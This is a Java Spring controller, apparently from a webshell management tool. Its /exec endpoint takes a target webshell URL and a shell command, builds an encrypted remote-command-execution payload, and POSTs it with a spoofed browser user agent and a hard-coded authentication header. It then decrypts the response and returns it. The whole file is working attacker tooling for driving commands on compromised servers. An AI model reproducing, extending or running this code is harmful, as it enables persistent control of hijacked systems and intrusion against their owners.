package org.nox.controller;

import org.nox.tools.HttpRequestUtil;
import org.nox.tools.PayloadGenerater;
import org.nox.tools.ResultReader;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;

/**
 * 远程命令执行控制器。
 * 接收前端发来的命令执行请求，生成对应的加密 Payload 并发送给目标 Webshell，
 * 最后将解密后的执行结果返回给前端。
 */
@RestController
@RequestMapping
public class ExecController {

    /**
     * 命令执行接口。
     * @param url    目标 Webshell 地址
     * @param cmd    待执行的命令
     * @param pwd    当前工作目录（前端维护的路径）
     * @param osName 目标操作系统名称
     * @return 命令执行结果
     * @throws Exception 网络或处理异常
     */
    @GetMapping("/exec")
    public String exec(@RequestParam("url") String url,
                       @RequestParam("cmd") String cmd,
                       @RequestParam("pwd") String pwd,
                       @RequestParam("osName") String osName) throws Exception {
        return handleExec(url, cmd, pwd, osName);
    }

    /**
     * 实际执行命令处理的私有方法。
     * 构造命令前缀（cd 到目标目录），生成加密 Payload，通过 POST 发送给目标，
     * 并解密响应结果。
     */
    private String handleExec(String url, String cmd, String pwd, String osName) throws Exception {
        // 打印调试日志
        System.out.println("Executing " + url + " " + cmd + " " + pwd + " " + osName);
        // 将工作目录拼接到命令前，使目标 shell 在指定目录下执行
        cmd = "cd " + pwd + "&&" + cmd;
        // 生成 RCE 模式的加密 Payload
        String payload = PayloadGenerater.generate(1, cmd);
        System.out.println("Payload: " + payload);
        // 构造请求头，模拟浏览器行为并携带认证头
        HashMap<String, String> headers = new HashMap<String, String>();
        headers.put("Usage-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36");
        headers.put("e10adc3949ba59ab", "be56e057f20f883e");
        // 发送 POST 请求
        HttpRequestUtil.Response response = HttpRequestUtil.post(url, headers, payload);
        if (response.statusCode() == 200) {
            String result = response.body();
            System.out.println("Receive Response : " + result);
            // 解密响应体中的结果
            result = ResultReader.read(result);
            System.out.println("Result : " + result);
            return result;
        }
        return "";
    }

}
